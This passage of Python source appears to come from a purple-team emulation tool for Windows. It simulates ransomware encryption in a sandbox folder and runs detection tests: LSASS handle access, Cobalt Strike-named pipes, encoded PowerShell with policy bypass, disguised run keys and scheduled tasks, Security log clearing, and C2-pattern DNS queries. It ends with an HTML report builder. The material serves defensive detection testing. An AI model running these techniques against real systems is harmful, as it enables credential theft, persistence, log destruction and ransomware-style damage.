        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives import hashes
        from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    except ImportError:
        _err("pip install cryptography")
        sys.exit(1)
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=b"purpleteam_salt_2024", iterations=100000)
    key = base64.urlsafe_b64encode(kdf.derive(RANSOM_KEY.encode()))
    fernet = Fernet(key)
    _info(f"Decrypting in {RANSOM_SIM_DIR} ...")
    dec = 0
    fail = 0
    for rel in RANSOM_MANIFEST.read_text(encoding="utf-8").strip().split("\n"):
        rel = rel.strip()
        if not rel: continue
        ef = RANSOM_SIM_DIR / (rel + RANSOM_EXT)
        of = RANSOM_SIM_DIR / rel
        if not ef.exists():
            _warn(f"Skip: {rel}")
            continue
        of.parent.mkdir(parents=True, exist_ok=True)
        try:
            of.write_bytes(fernet.decrypt(ef.read_bytes()))
            ef.unlink()
            _ok(f"Decrypted: {rel}")
            dec += 1
        except Exception:
            _err(f"Failed: {rel}")
            fail += 1
    for n in RANSOM_SIM_DIR.rglob("!_README_PURPLETEAM_!.txt"): n.unlink()
    print()
    _ok(f"Decryption complete: {dec} recovered, {fail} failed")
    _info(f"Files restored to: {RANSOM_SIM_DIR}")
    if fail == 0 and dec > 0:
        RANSOM_MANIFEST.unlink()
        _info("Manifest cleared")


def cleanup_simulation() -> None:
    _banner("PURPLE TEAM — SIMULATION CLEANUP")
    if RANSOM_SIM_DIR.exists():
        shutil.rmtree(RANSOM_SIM_DIR)
        _ok(f"Removed: {RANSOM_SIM_DIR}")
    else:
        _info(f"Not found: {RANSOM_SIM_DIR}")
    print(); _ok("Cleanup complete")


# ───────────────────────────────────────────────────────────────────────────
# PHASE 11: IMPACT SIMULATION (Ransomware TTPs)
# ───────────────────────────────────────────────────────────────────────────

def phase_impact() -> None:
    begin_phase("11", f"Impact Simulation {C.Y}(Reversible){C.RS}",
                "T1486, T1490, T1489, T1529, T1485",
                "Simulate ransomware: create targets, encrypt with AES-256, drop ransom notes")

    _warn(f"CONTROLLED SIMULATION — all operations in {RANSOM_SIM_DIR}")
    _info("Decrypt: python agent.py --decrypt")
    _info("Cleanup: python agent.py --cleanup")
    print()

    # Pre-encryption recon
    exe.run("vssadmin", ["list", "shadows"], "T1490", "VSS enumeration")
    exe.run("sc", ["query", "VSS"], "T1490", "VSS service")
    exe.cmd("wbadmin get versions 2>nul", "T1490", "Windows Backup versions")
    exe.cmd('sc query type= service | findstr /i /c:"backup" /c:"vss" /c:"wbengine" /c:"sql" /c:"exchange" /c:"vmware" /c:"veeam"',
            "T1489", "Backup services")
    exe.cmd('sc query type= service | findstr /i /c:"MSSQL" /c:"MySQL" /c:"postgres" /c:"oracle" /c:"mongodb" /c:"redis"',
            "T1489", "Database services")

    # Real target enumeration (read-only)
    exe.total += 1
    _act("Enumerating real encryption targets...")
    targets = ["*.docx", "*.xlsx", "*.pdf", "*.jpg", "*.png", "*.pptx", "*.zip", "*.bak", "*.sql"]
    tc = 0
    for t in targets:
        r = exe.cmd(f'dir "C:\\\\Users\\\\*\\\\Documents\\\\{t}" /s /b 2>nul', "T1486", f"Enumerate {t}")
        if r.success and r.stdout:
            tc += len([l for l in r.stdout.strip().split("\n") if l.strip()])
    if tc > 0:
        _ok(f"Identified {tc} real files (NOT encrypting)", "T1486")
        log.add_finding(Finding(
            "INFO", "T1486", f"{tc} real files identified as ransomware targets",
            remediation="Implement canary files; monitor mass file extension changes",
            detection="Mass file rename events, high disk I/O from encryption"))
    else:
        _info("No target files found")
        exe.fail += 1

    # Simulation
    print()
    print(f"  {C.M}── Ransomware Encryption Simulation ──{C.RS}")
    print()
    if RANSOM_SIM_DIR.exists():
        _warn("Previous simulation exists — removing")
        shutil.rmtree(RANSOM_SIM_DIR)
    RANSOM_SIM_DIR.mkdir(parents=True, exist_ok=True)
    _build_tree(RANSOM_SIM_DIR)
    _encrypt_tree(RANSOM_SIM_DIR)
    _drop_notes(RANSOM_SIM_DIR)

    exe.total += 1
    _act("Post-encryption state:")
    for f in sorted(RANSOM_SIM_DIR.rglob("*")):
        if f.is_file(): _det(str(f.relative_to(RANSOM_SIM_DIR)))
    _ok("Encryption simulation complete", "T1486")

    exe.run("wevtutil", ["gl", "Security"], "T1070.001", "Security log size")
    exe.run("bcdedit", ["/enum"], "T1490", "Boot config")
    exe.run("net", ["use"], "T1486", "Network drives")

    print()
    _warn("Impact simulation complete")
    _info(f"Encrypted in: {RANSOM_SIM_DIR}")
    _info("Decrypt: python agent.py --decrypt")
    _info("Cleanup: python agent.py --cleanup")
    end_phase()


# ───────────────────────────────────────────────────────────────────────────
# PHASE 12: EICAR AV DETECTION TEST
# ───────────────────────────────────────────────────────────────────────────

# ─────────────────────────────────────────────────────────────────────────────
# DETECTION TEST HELPERS
# ─────────────────────────────────────────────────────────────────────────────
# Each helper returns (outcome, detail).
# outcome: "EXECUTED" — TTP succeeded; blue team should have an alert
#          "BLOCKED"  — security control stopped it; note which control
#          "ERROR"    — test could not run (environment issue)

import ctypes
import ctypes.wintypes

def _dt_lsass_handle() -> Tuple[str, str]:
    """Open LSASS with PROCESS_VM_READ | PROCESS_QUERY_INFORMATION.
    Handle is closed immediately — no memory is read.
    Expected: Sysmon Event 10 (ProcessAccess)."""
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ           = 0x0010
    ACCESS_MASK = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ

    try:
        res = subprocess.run(
            ["tasklist", "/fi", "imagename eq lsass.exe", "/fo", "csv", "/nh"],
            capture_output=True, text=True, timeout=5, errors="replace")
        lsass_pid = None
        for line in res.stdout.strip().splitlines():
            if "lsass.exe" in line.lower():
                parts = line.strip().strip('"').split('","')
                if len(parts) >= 2:
                    lsass_pid = int(parts[1])
                    break
        if lsass_pid is None:
            return "ERROR", "LSASS PID not found in tasklist"
    except Exception as exc:
        return "ERROR", f"PID lookup failed: {exc}"

    handle = ctypes.windll.kernel32.OpenProcess(ACCESS_MASK, False, lsass_pid)
    if handle and ctypes.cast(handle, ctypes.c_void_p).value not in (None, 0):
        ctypes.windll.kernel32.CloseHandle(handle)
        return "EXECUTED", f"Handle opened+closed on LSASS PID {lsass_pid} — no memory read"
    err = ctypes.windll.kernel32.GetLastError()
    desc = "LSA Protection (PPL) active" if err == 5 else f"GetLastError={err}"
    return "BLOCKED", f"OpenProcess denied on PID {lsass_pid} — {desc}"


def _dt_named_pipe() -> Tuple[str, str]:
    """Create a named pipe matching known Cobalt Strike default names.
    Expected: Sysmon Event 17 (PipeCreated)."""
    PIPE_ACCESS_DUPLEX = 0x00000003
    PIPE_TYPE_BYTE     = 0x00000000
    INVALID_HANDLE     = ctypes.c_void_p(-1).value

    # Publicly documented default CS pipe names (threat intel sources)
    pipe_names = [
        r"\\.\pipe\MSSE-1337-server",
        r"\\.\pipe\postex_ssh_1234",
    ]
    for pipe_name in pipe_names:
        handle = ctypes.windll.kernel32.CreateNamedPipeW(
            pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 1, 512, 512, 0, None)
        hval = ctypes.cast(handle, ctypes.c_void_p).value
        if hval and hval != INVALID_HANDLE:
            ctypes.windll.kernel32.CloseHandle(handle)
            return "EXECUTED", f"Named pipe '{pipe_name}' created+closed"
    err = ctypes.windll.kernel32.GetLastError()
    return "BLOCKED", f"CreateNamedPipe blocked (error {err})"


def _dt_encoded_powershell() -> Tuple[str, str]:
    """Execute a base64-encoded PS command with a benign payload.
    Expected: Security Event 4104 (Script Block Logging), Sysmon Event 1."""
    import base64
    payload = "Write-Output 'PURPLE_TEAM_DETECTION_VALIDATION_OK'"
    encoded = base64.b64encode(payload.encode("utf-16-le")).decode()
    try:
        res = subprocess.run(
            ["powershell.exe", "-NoProfile", "-NonInteractive",
             "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded],
            capture_output=True, text=True, timeout=15, errors="replace")
        if res.returncode == 0 and "PURPLE_TEAM" in res.stdout:
            return "EXECUTED", f"EncodedCommand ran cleanly — payload: {payload[:50]}"
        return "ERROR", f"Exit {res.returncode}: {res.stderr.strip()[:80]}"
    except Exception as exc:
        return "ERROR", f"PS execution failed: {exc}"


def _dt_run_key() -> Tuple[str, str]:
    """Add then immediately remove a disguised HKCU run key.
    Expected: Security Event 4657 (Registry value modified/created)."""
    KEY  = r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    VAL  = "MicrosoftSecurityHealthService_Update"
    DATA = r"C:\Windows\Temp\MsMpEng.exe"   # AV binary name in wrong path
    add = subprocess.run(
        ["reg", "add", KEY, "/v", VAL, "/t", "REG_SZ", "/d", DATA, "/f"],
        capture_output=True, text=True, timeout=10, errors="replace")
    if add.returncode == 0:
        subprocess.run(["reg", "delete", KEY, "/v", VAL, "/f"],
                       capture_output=True, timeout=10)
        return "EXECUTED", f"Run key '{VAL}' → '{DATA}' added+removed"
    return "BLOCKED", f"reg add denied (exit {add.returncode})"


def _dt_scheduled_task() -> Tuple[str, str]:
    """Create then delete a disguised scheduled task.
    Expected: Security Events 4698 (created) + 4699 (deleted)."""
    TASK = r"\Microsoft\Windows\MUI\LpeNotifyUserOfPreferredLanguage_pt"
    create = subprocess.run(
        ["schtasks", "/create", "/tn", TASK,
         "/tr", r"cmd.exe /c echo PURPLE_TEAM_PERSISTENCE_SIM",
         "/sc", "once", "/st", "00:00", "/f"],
        capture_output=True, text=True, timeout=15, errors="replace")
    if create.returncode == 0:
        subprocess.run(["schtasks", "/delete", "/tn", TASK, "/f"],
                       capture_output=True, timeout=10)
        return "EXECUTED", f"Task '{TASK}' created+deleted"
    stderr = create.stderr.strip()[:100]
    return "BLOCKED", f"schtasks /create denied (exit {create.returncode}) — {stderr}"


def _dt_log_clear() -> Tuple[str, str]:
    """Attempt to clear the Security event log.
    Expected: Event 1102 if successful (admin); access denied logged otherwise."""
    res = subprocess.run(
        ["wevtutil", "cl", "Security"],
        capture_output=True, text=True, timeout=10, errors="replace")
    if res.returncode == 0:
        return "EXECUTED", "Security log CLEARED — agent is running with admin rights (review scope)"
    err = (res.stderr.strip() or f"exit {res.returncode}")[:100]
    return "BLOCKED", f"Log clear denied (expected as non-admin) — {err}"


def _dt_dns_c2_pattern() -> Tuple[str, str]:
    """Query domains matching DGA / C2 subdomain patterns.
    Uses IANA-reserved .test TLD — will never reach real infrastructure.
    Expected: Sysmon Event 22 (DNSQuery), DNS server analytic logs."""
    domains = [
        "a3f8b2c1d9e74f01.telemetry-cdn.test",   # hex-DGA subdomain pattern
        "update.windowsdefender-cloud.test",       # typosquatting pattern
        "beacon.cdn-delivery-network.test",        # beacon label pattern
    ]
    for d in domains:
        subprocess.run(["nslookup", d], capture_output=True, timeout=5)
    return "EXECUTED", f"DNS queries: {len(domains)} C2-pattern FQDNs (.test TLD, no real infra contacted)"


def _dt_privilege_enum() -> Tuple[str, str]:
    """Run whoami /priv /groups — mimics attacker privilege assessment.
    Expected: Sysmon Event 1 (whoami with /priv argument)."""
    res = subprocess.run(
        ["whoami.exe", "/priv", "/groups"],
        capture_output=True, text=True, timeout=10, errors="replace")
    if res.returncode == 0:
        has_se = [l.split()[0] for l in res.stdout.splitlines()
                  if l.strip().startswith("Se") and "Enabled" in l]
        return "EXECUTED", f"whoami /priv /groups — {len(has_se)} enabled privileges enumerated"
    return "ERROR", f"whoami failed (exit {res.returncode})"


# ── Ordered test manifest ───────────────────────────────────────────────────

DETECTION_TESTS: List[Dict] = [
    {
        "id": "DT-001", "fn": _dt_lsass_handle,
        "name": "LSASS Handle Access",
        "technique": "T1003.001",
        "expected_events": [
            "Sysmon EventID 10 (ProcessAccess) — TargetImage: lsass.exe, GrantedAccess: 0x1410",
            "EDR alert: Credential Access — LSASS handle from python.exe",
        ],
    },
    {
        "id": "DT-002", "fn": _dt_named_pipe,
        "name": "Cobalt Strike Named Pipe",
        "technique": "T1071",
        "expected_events": [
            "Sysmon EventID 17 (PipeCreated) — PipeName: \\\\MSSE-1337-server or postex_ssh",
            "EDR alert: Suspicious named pipe matching known C2 framework",
        ],
    },
    {
        "id": "DT-003", "fn": _dt_encoded_powershell,
        "name": "Base64-Encoded PowerShell",
        "technique": "T1059.001",
        "expected_events": [
            "Security EventID 4104 (Script Block Logging) — ScriptBlockText decoded",
            "Sysmon EventID 1 — CommandLine contains -EncodedCommand",
        ],
    },
    {
        "id": "DT-004", "fn": _dt_run_key,
        "name": "Fake Malware Run Key",
        "technique": "T1547.001",
        "expected_events": [
            "Security EventID 4657 — ObjectName: HKCU\\\\CurrentVersion\\\\Run, new value created",
            "SIEM rule: Suspicious run key value pointing to %TEMP% or Windows\\\\Temp",
        ],
    },
    {
        "id": "DT-005", "fn": _dt_scheduled_task,
        "name": "Disguised Scheduled Task",
        "technique": "T1053.005",
        "expected_events": [
            "Security EventID 4698 (Task Created) — task under \\\\Microsoft\\\\Windows\\\\MUI",
            "Sysmon EventID 1 — schtasks.exe /create",
        ],
    },
    {
        "id": "DT-006", "fn": _dt_log_clear,
        "name": "Security Log Clear Attempt",
        "technique": "T1070.001",
        "expected_events": [
            "Security EventID 1102 if successful (admin path)",
            "Process creation of wevtutil cl Security — detectable even when blocked",
        ],
    },
    {
        "id": "DT-007", "fn": _dt_dns_c2_pattern,
        "name": "DGA / C2-Pattern DNS Queries",
        "technique": "T1071.004",
        "expected_events": [
            "Sysmon EventID 22 (DNSQuery) — QueryName matching hex-DGA pattern",
            "DNS resolver / firewall logs — queries to .test FQDN with suspicious labels",
        ],
    },
    {
        "id": "DT-008", "fn": _dt_privilege_enum,
        "name": "Privilege & Group Enumeration",
        "technique": "T1134",
        "expected_events": [
            "Sysmon EventID 1 — whoami.exe with /priv /groups arguments",
            "SIEM: multiple enumeration commands in short time window (chain with DT-001)",
        ],
    },
]


def _print_detection_report(results: List[DetectionResult], log_obj) -> None:
    """Print terminal + text-log report: coverage table then SIEM rules."""
    W = 72

    # ── Terminal: detection coverage table ────────────────────────────────
    print()
    print(f"{C.CYN}╔{'═'*W}╗{C.RS}")
    print(f"{C.CYN}║{C.RS} {C.W}BLUE TEAM DETECTION VALIDATION — RESULTS{C.RS}{' '*(W-42)}{C.CYN}║{C.RS}")
    print(f"{C.CYN}╠{'═'*W}╣{C.RS}")
    hdr = f"  {'ID':<8} {'TEST':<34} {'TECHNIQUE':<12} {'OUTCOME'}"
    print(f"{C.CYN}║{C.RS}{C.D}{hdr}{C.RS}{' '*(W-len(hdr))}{C.CYN}║{C.RS}")
    print(f"{C.CYN}╠{'─'*W}╣{C.RS}")

    outcome_col = {"EXECUTED": C.R, "BLOCKED": C.G, "ERROR": C.Y}
    executed = sum(1 for r in results if r.outcome == "EXECUTED")
    blocked  = sum(1 for r in results if r.outcome == "BLOCKED")
    errors   = sum(1 for r in results if r.outcome == "ERROR")

    for r in results:
        col = outcome_col.get(r.outcome, C.W)
        row = f"  {r.test_id:<8} {r.test_name[:34]:<34} {r.technique:<12} "
        outcome_str = f"{col}{r.outcome}{C.RS}"
        pad = W - len(row) - len(r.outcome)
        print(f"{C.CYN}║{C.RS}{row}{outcome_str}{' '*max(pad,1)}{C.CYN}║{C.RS}")

    print(f"{C.CYN}╠{'═'*W}╣{C.RS}")
    ex_col = C.R if executed > 0 else C.G
    bl_col = C.G if blocked  > 0 else C.Y
    print(f"{C.CYN}║{C.RS}  {ex_col}EXECUTED (blue team should have alerted): {executed}/{len(results)}{C.RS}{' '*(W-46-len(str(executed))-len(str(len(results))))}{C.CYN}║{C.RS}")
    print(f"{C.CYN}║{C.RS}  {bl_col}BLOCKED  (control prevented execution)  : {blocked}/{len(results)}{C.RS}{' '*(W-46-len(str(blocked))-len(str(len(results))))}{C.CYN}║{C.RS}")
    print(f"{C.CYN}╚{'═'*W}╝{C.RS}")

    # ── Terminal: per-test detail + expected events ────────────────────────
    print()
    print(f"{C.W}── Detection Detail ──{C.RS}")
    for r in results:
        col = outcome_col.get(r.outcome, C.W)
        print(f"\n  {col}[{r.outcome}]{C.RS} {C.W}{r.test_id}{C.RS} {r.test_name} | {C.D}{r.technique}{C.RS}")
        print(f"    {C.D}{r.detail}{C.RS}")
        print(f"    {C.B}Blue team should see:{C.RS}")
        for ev in r.expected_events:
            print(f"      {C.D}• {ev}{C.RS}")

    # ── Terminal: SIEM rules ───────────────────────────────────────────────
    print()
    print(f"{C.CYN}╔{'═'*W}╗{C.RS}")
    print(f"{C.CYN}║{C.RS} {C.W}SIEM DETECTION RULES{C.RS}{' '*(W-20)}{C.CYN}║{C.RS}")
    print(f"{C.CYN}╚{'═'*W}╝{C.RS}")
    sev_col = {"CRITICAL": C.R, "HIGH": C.R, "MEDIUM": C.Y}
    for rule in SIEM_RULES:
        col = sev_col.get(rule["severity"], C.W)
        print(f"\n  {col}[{rule['severity']}]{C.RS} {C.W}{rule['id']}{C.RS} — {rule['title']}")
        print(f"  {C.D}MITRE   : {rule['mitre']}{C.RS}")
        print(f"  {C.D}Source  : {rule['log_source']}{C.RS}")
        print(f"  {C.D}Platforms: {', '.join(rule['platforms'])}{C.RS}")
        print(f"  {C.B}Detection (Sigma):{C.RS}")
        for line in rule["sigma_detection"].splitlines():
            print(f"    {C.D}{line}{C.RS}")
        print(f"  {C.Y}Response: {rule['response']}{C.RS}")
    print()

    # ── Text log ──────────────────────────────────────────────────────────
    log_obj.write(0, "")
    log_obj.write(0, "── BLUE TEAM DETECTION VALIDATION ──────────────────────────────────────")
    log_obj.write(0, f"  {'ID':<8} {'TEST':<34} {'TECHNIQUE':<12} OUTCOME")
    log_obj.write(0, f"  {'─'*8} {'─'*34} {'─'*12} {'─'*8}")
    for r in results:
        log_obj.write(0, f"  {r.test_id:<8} {r.test_name[:34]:<34} {r.technique:<12} {r.outcome}")
    log_obj.write(0, "")
    log_obj.write(0, f"  EXECUTED (needs blue team response): {executed}/{len(results)}")
    log_obj.write(0, f"  BLOCKED  (control active)          : {blocked}/{len(results)}")
    log_obj.write(0, "")
    log_obj.write(0, "  Detail:")
    for r in results:
        log_obj.write(0, f"    [{r.outcome}] {r.test_id} {r.test_name}: {r.detail}")
        for ev in r.expected_events:
            log_obj.write(0, f"      expected: {ev}")
    log_obj.write(0, "")
    log_obj.write(0, "── SIEM RULES ──────────────────────────────────────────────────────────")
    for rule in SIEM_RULES:
        log_obj.write(0, f"\n  [{rule['severity']}] {rule['id']} — {rule['title']}")
        log_obj.write(0, f"    MITRE   : {rule['mitre']}")
        log_obj.write(0, f"    Source  : {rule['log_source']}")
        log_obj.write(0, f"    Platforms: {', '.join(rule['platforms'])}")
        log_obj.write(0, f"    Detection:")
        for line in rule["sigma_detection"].splitlines():
            log_obj.write(0, f"      {line}")
        log_obj.write(0, f"    FP      : {'; '.join(rule['false_positives'])}")
        log_obj.write(0, f"    Response: {rule['response']}")
    log_obj.write(0, "")
    log_obj.write(0, "────────────────────────────────────────────────────────────────────────")


def phase_detection_validation() -> None:
    begin_phase("12", "Blue Team Detection Validation",
                "T1003.001, T1071, T1059.001, T1547.001, T1053.005, T1070.001, T1071.004, T1134",
                "Trigger real security events — tests blue team detection, not AV signatures")

    _warn("All tests are reversible — artefacts created are immediately cleaned up")
    _warn("EXECUTED = TTP ran; blue team MUST have received an alert for this to be a pass")
    print()

    for test in DETECTION_TESTS:
        exe.total += 1
        _act(f"{test['id']} — {test['name']}", test["technique"])
        try:
            outcome, detail = test["fn"]()
        except Exception as exc:
            outcome, detail = "ERROR", str(exc)[:120]

        if outcome == "EXECUTED":
            exe.ok += 1
            _warn(f"{test['id']} EXECUTED — blue team alert expected", test["technique"])
        elif outcome == "BLOCKED":
            exe.ok += 1
            _ok(f"{test['id']} BLOCKED by security control", test["technique"])
        else:
            exe.fail += 1
            _err(f"{test['id']} ERROR — {detail[:80]}", test["technique"])

        log.write(4, f"[{_ts()}] [ACTION] {test['id']} {test['name']} | {test['technique']}")
        log.write(8, f"Outcome: {outcome}")
        log.write(8, f"Detail:  {detail}")
        log.json_event(outcome, test["technique"], log.phase,
                       f"{test['id']} {test['name']}", detail, "")

        result = DetectionResult(
            test_id=test["id"], test_name=test["name"],
            technique=test["technique"], outcome=outcome, detail=detail,
            expected_events=test["expected_events"])
        log.detection_results.append(result)

        if outcome == "EXECUTED":
            sev = "HIGH" if test["id"] in ("DT-001", "DT-002") else "MEDIUM"
            log.add_finding(Finding(
                sev, test["technique"],
                f"{test['id']} {test['name']} — TTP executed, blue team alert expected",
                remediation=f"Verify alert fired in SIEM/EDR; tune rules for: {test['expected_events'][0]}",
                detection="; ".join(test["expected_events"])))
            _find(sev, f"{test['id']} executed — no blue team alert = detection gap")
        elif outcome == "BLOCKED":
            _find("INFO", f"{test['id']} blocked — control is working")

        time.sleep(0.3)

    _print_detection_report(log.detection_results, log)
    end_phase()


# Keep old name as alias so --phase 12 still resolves (phases_map updated below)
phase_eicar = phase_detection_validation


# ───────────────────────────────────────────────────────────────────────────
# HTML REPORT GENERATOR
# ───────────────────────────────────────────────────────────────────────────

def generate_html_report() -> None:
    """Generate a professional HTML report from the current log data."""
    if not log.events:
        _info("No events to report")
        return

    severity_colors = {
        "CRITICAL": "#dc2626", "HIGH": "#ea580c", "MEDIUM": "#ca8a04",
        "LOW": "#0891b2", "INFO": "#6b7280",
    }
    outcome_colors = {"EXECUTED": "#ea580c", "BLOCKED": "#16a34a", "ERROR": "#ca8a04"}
    status_colors  = {"SUCCESS": "#16a34a", "FAILED": "#dc2626", "TIMEOUT": "#ca8a04"}
    sev_rule_colors = {"CRITICAL": "#dc2626", "HIGH": "#ea580c", "MEDIUM": "#ca8a04", "LOW": "#0891b2"}

    # ── Findings ──────────────────────────────────────────────────────────────
    findings_html = ""
    for f in log.findings:
        col = severity_colors.get(f.severity, "#6b7280")
        rem = html.escape(f.remediation) if f.remediation else "N/A"
        det = html.escape(f.detection)   if f.detection   else "N/A"
        findings_html += f"""
        <div class="finding-card" style="border-left:4px solid {col}">
          <div class="finding-header">
            <span class="badge" style="background:{col};color:#fff">{html.escape(f.severity)}</span>
            <span class="tech">{html.escape(f.technique)}</span>
          </div>
          <div class="finding-body">{html.escape(f.message)}</div>
          <div class="finding-meta">
            <strong>Remediation:</strong> {rem}<br>
            <strong>Detection:</strong> {det}
          </div>
        </div>"""

    # ── AV Coverage table ────────────────────────────────────────────────────
    eicar_rows = ""
    executed    = sum(1 for r in log.detection_results if r.outcome == "EXECUTED")
    blocked     = sum(1 for r in log.detection_results if r.outcome == "BLOCKED")
    errors      = sum(1 for r in log.detection_results if r.outcome == "ERROR")
    total_eicar = len(log.detection_results)
    _dr_denom   = executed + blocked
    _dr         = (blocked / _dr_denom * 100) if _dr_denom > 0 else None
    detection_rate_str   = f"{_dr:.0f}%" if _dr is not None else "N/A"
    detection_rate_color = ("#16a34a" if _dr is not None and _dr >= 75
                            else "#ca8a04" if _dr is not None and _dr >= 50
                            else "#dc2626")
    for r in log.detection_results:
        col = outcome_colors.get(r.outcome, "#6b7280")
        eicar_rows += f"""
        <tr>
          <td>{html.escape(r.test_id)}</td>
          <td>{html.escape(r.test_name)}</td>
          <td><code>{html.escape(r.technique)}</code></td>
          <td><span class="badge" style="background:{col};color:#fff">{html.escape(r.outcome)}</span></td>
          <td style="font-size:.8rem">{html.escape(r.detail[:80])}</td>
        </tr>"""
    eicar_summary = (
        f'<div style="display:flex;gap:1rem;margin-top:1rem;flex-wrap:wrap">'
        f'<span class="badge" style="background:#ea580c;color:#fff">Executed&nbsp;(gaps)&nbsp;{executed}</span>'
        f'<span class="badge" style="background:#16a34a;color:#fff">Blocked&nbsp;{blocked}</span>'
        f'<span class="badge" style="background:{detection_rate_color};color:#fff">Detection&nbsp;Rate&nbsp;{detection_rate_str}</span>'
        f'<span class="badge" style="background:#334155;color:#fff">Total&nbsp;{total_eicar}</span>'
        f'</div>'
    ) if total_eicar else ""
    eicar_section = f"""
<div class="section">
<h2>🎯 Blue Team Detection Validation Results</h2>
{eicar_summary}
<div style="overflow-x:auto;margin-top:1rem">
<table>
<thead><tr><th>ID</th><th>Test Name</th><th>Technique</th><th>Outcome</th><th>Detail</th></tr></thead>
<tbody>{eicar_rows if eicar_rows else '<tr><td colspan="5" style="color:var(--muted)">Phase 12 (Detection Validation) was not run.</td></tr>'}</tbody>
</table>
</div>
</div>""" if True else ""

    # ── SIEM Rules ────────────────────────────────────────────────────────────
    siem_html = ""
    for rule in SIEM_RULES:
        col = sev_rule_colors.get(rule["severity"], "#6b7280")
        detection_escaped = html.escape(rule["sigma_detection"]).replace("\n", "<br>").replace("  ", "&nbsp;&nbsp;")
        siem_html += f"""
        <div class="finding-card" style="border-left:4px solid {col}">
          <div class="finding-header">
            <span class="badge" style="background:{col};color:#fff">{html.escape(rule['severity'])}</span>
            <span style="font-weight:600;color:var(--text)">{html.escape(rule['id'])}</span>
            <span class="tech">{html.escape(rule['mitre'])}</span>
          </div>
          <div class="finding-body">{html.escape(rule['title'])}</div>
          <div class="finding-meta" style="margin-top:.5rem">
            <strong>Log source:</strong> {html.escape(rule['log_source'])}<br>
            <strong>Platforms:</strong> {html.escape(', '.join(rule['platforms']))}<br>
            <strong>Detection (Sigma):</strong><br>
            <pre style="background:#0f172a;padding:.75rem;border-radius:.375rem;overflow-x:auto;font-size:.8rem;margin:.5rem 0">{html.escape(rule['sigma_detection'])}</pre>
            <strong>False positives:</strong> {html.escape('; '.join(rule['false_positives']))}<br>
            <strong>Response:</strong> {html.escape(rule['response'])}
          </div>
        </div>"""

    # ── Event log ────────────────────────────────────────────────────────────
    events_html = ""
    for e in log.events:
        col = status_colors.get(e.get("status", ""), "#6b7280")
        events_html += f"""
        <tr>
          <td style="white-space:nowrap">{html.escape(e.get('timestamp',''))}</td>
          <td><span class="badge" style="background:{col};color:#fff">{html.escape(e.get('status',''))}</span></td>
          <td>{html.escape(e.get('technique',''))}</td>
          <td>{html.escape(e.get('phase',''))}</td>
          <td>{html.escape(e.get('description',''))}</td>
        </tr>"""

    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Purple Team Report — {html.escape(SCRIPT_VERSION)}</title>
<style>
:root{{--bg:#0f172a;--card:#1e293b;--text:#e2e8f0;--muted:#94a3b8;--accent:#38bdf8;}}
*{{box-sizing:border-box;}}
body{{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);margin:0;padding:2rem;}}
.container{{max-width:1200px;margin:0 auto;}}
header{{text-align:center;margin-bottom:2rem;padding-bottom:1rem;border-bottom:1px solid #334155;}}
header h1{{margin:0;color:var(--accent);font-size:2rem;}}
header p{{color:var(--muted);margin:.5rem 0;}}
.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:1rem;margin-bottom:2rem;}}
.stat-card{{background:var(--card);padding:1.5rem;border-radius:.75rem;text-align:center;}}
.stat-card .number{{font-size:2rem;font-weight:bold;color:var(--accent);}}
.stat-card .label{{color:var(--muted);font-size:.875rem;}}
.section{{background:var(--card);border-radius:.75rem;padding:1.5rem;margin-bottom:1.5rem;}}
.section h2{{margin-top:0;color:var(--accent);font-size:1.25rem;}}
.finding-card{{background:#0f172a;padding:1rem;margin-bottom:.75rem;border-radius:.5rem;}}
.finding-header{{display:flex;gap:.5rem;align-items:center;margin-bottom:.5rem;flex-wrap:wrap;}}
.badge{{padding:.25rem .5rem;border-radius:.25rem;font-size:.75rem;font-weight:600;white-space:nowrap;}}
.tech{{color:var(--muted);font-size:.875rem;}}
.finding-body{{margin-bottom:.5rem;font-weight:500;}}
.finding-meta{{font-size:.8rem;color:var(--muted);line-height:1.6;}}
table{{width:100%;border-collapse:collapse;font-size:.875rem;}}
th{{text-align:left;padding:.75rem;border-bottom:2px solid #334155;color:var(--muted);font-weight:600;}}
td{{padding:.75rem;border-bottom:1px solid #1e3a5a;vertical-align:top;}}
tr:hover td{{background:#172033;}}
code{{background:#0f172a;padding:.1rem .35rem;border-radius:.2rem;font-size:.8rem;}}
pre{{margin:0;white-space:pre-wrap;word-break:break-all;}}
footer{{text-align:center;color:var(--muted);font-size:.8rem;margin-top:2rem;padding-top:1rem;border-top:1px solid #334155;}}
</style>
</head>
<body>
<div class="container">
<header>
<h1>🛡️ Purple Team Exercise Report</h1>
<p>v{html.escape(SCRIPT_VERSION)} &nbsp;|&nbsp; Run ID: {html.escape(log.run_id)} &nbsp;|&nbsp; {html.escape(datetime.now().strftime('%d/%m/%Y %H:%M:%S'))}</p>
</header>

<div class="grid">
<div class="stat-card"><div class="number">{exe.total}</div><div class="label">Total Actions</div></div>
<div class="stat-card"><div class="number" style="color:#16a34a">{exe.ok}</div><div class="label">Detected / Completed</div></div>
<div class="stat-card"><div class="number" style="color:#dc2626">{exe.fail}</div><div class="label">Blocked / Failed</div></div>
<div class="stat-card"><div class="number">{len(log.findings)}</div><div class="label">Findings</div></div>
<div class="stat-card"><div class="number" style="color:#ea580c">{executed}</div><div class="label">TTPs Executed (gaps)</div></div>
<div class="stat-card"><div class="number" style="color:#16a34a">{blocked}</div><div class="label">TTPs Blocked</div></div>
<div class="stat-card"><div class="number" style="color:{detection_rate_color}">{detection_rate_str}</div><div class="label">Detection Rate</div></div>
<div class="stat-card"><div class="number">{_elapsed(log.start)}</div><div class="label">Duration</div></div>
</div>

<div class="section">
<h2>🔍 Findings ({len(log.findings)})</h2>
{findings_html if findings_html else '<p style="color:var(--muted)">No findings recorded.</p>'}
</div>

{eicar_section}

<div class="section">
<h2>🔎 SIEM Detection Rules ({len(SIEM_RULES)})</h2>
<p style="color:var(--muted);font-size:.875rem">Sigma-compatible rules derived from this exercise. Import into your SIEM after adapting field mappings for your log source.</p>
{siem_html}
</div>

<div class="section">
